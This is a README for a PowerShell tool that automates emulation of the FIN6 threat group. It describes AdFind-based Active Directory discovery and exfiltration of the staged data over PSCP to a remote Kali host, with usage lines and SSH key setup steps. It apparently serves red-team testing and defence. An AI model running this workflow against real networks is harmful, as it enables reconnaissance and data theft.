# Automation Script for FIN6 Adversary Emulation

Summary: Powershell Script to Automate Adversary Emulation of FIN6 APT.

```
Usage Examples:
    .\FIN6_automation.ps1 -u kali -ip XXX.XXX.XXX.XXX -pkey [path_to_private_key].ppk

    -u     Username of the Remote Server.
    -ip    IP Address of the Remote Server.
    -pkey  The path to the private key file in .ppk format.
```

## Features:
- Discovery and Staging using [**AdFind**](https://www.joeware.net/freetools/tools/adfind/)
- Exfiltration using PuTTY Secure Copy Protocol [**PSCP**](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)

## Blog
For demonstration, please visit [**FIN6 Adversary Emulation - Phase 1**](https://kengentenerende.github.io/posts/FIN6-Adversary-Emulation-Phase-1/)

## Screenshots
![image](https://github.com/kengentenerende/Automation-FIN6-Adversary-Emulation/assets/46080752/b1ca41a3-d0fd-4aab-b174-8debf16b193d)

![image](https://github.com/kengentenerende/Automation-FIN6-Adversary-Emulation/assets/46080752/5a0b3803-605d-487b-a923-174173f7901b)

![image](https://github.com/kengentenerende/Automation-FIN6-Adversary-Emulation/assets/46080752/6830f6e7-3ca0-4366-b762-4604d0527e43)

## Pre-requisite
- [Open-SSH](https://github.com/PowerShell/Win32-OpenSSH)

## Required Installation

#### Step 1: Generate SSH Key Pairs using Putty

- Install latest version of the [Putty](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) Windows Installer executable package and install it onto your Target Machine.
- Open PuTTygen and proceed with Key Generation.
- Save both keys (Public and Private Keys) to a secure location on your computer.
  - ![image](https://github.com/kengentenerende/Automation-FIN6-Adversary-Emulation/assets/46080752/bb16249a-0267-4460-9124-2079ba4d09b1)
- Select and copy Public Key into a text file which will be later pasted into the OpenSSH authorized_keys file on the remote server.
  - ![image](https://github.com/kengentenerende/Automation-FIN6-Adversary-Emulation/assets/46080752/d6ffb213-8f64-4b51-9d81-3606f30d41ba)

#### Step 2: Generate SSH Key Pairs using ssh-keygen
- Open a new PowerShell window and generate a new SSH key-pair with the `ssh-keygen` command. By default, the public and private keys will be placed in the `%USERPROFILE%/.ssh/` directory. The public key file we are interested in is named `id_rsa.pub`. Save the 2 generated Public Keys in a single file.
  - ![image](https://github.com/kengentenerende/Automation-FIN6-Adversary-Emulation/assets/46080752/2ad76b58-2987-4489-abb1-c1c154a57ff4)
  
#### Step 3: Passwordless SSH Connectivity to Remote Linux Device
-   Run the following powershell script [SSH_pwdless_login](https://github.com/kengentenerende/Automation-FIN6-Adversary-Emulation/blob/main/_script/SSH_pwdless_login.ps1). This will copy the contents of the id_rsa.pub public key to a remote Linux device

```
Usage Examples:
  .\SSH_paswordless_login.ps1 -u kali -ip XXX.XXX.XXX.XXX -akey [path_to_public_key]

    -u     Username of the Remote Server.
    -ip    IP Address of the Remote Server.
    -akey  The path to the Public Key Pair.
```
  - ![image](https://github.com/kengentenerende/Automation-FIN6-Adversary-Emulation/assets/46080752/cecc7338-bdc3-4108-a7ad-4280739bc371)
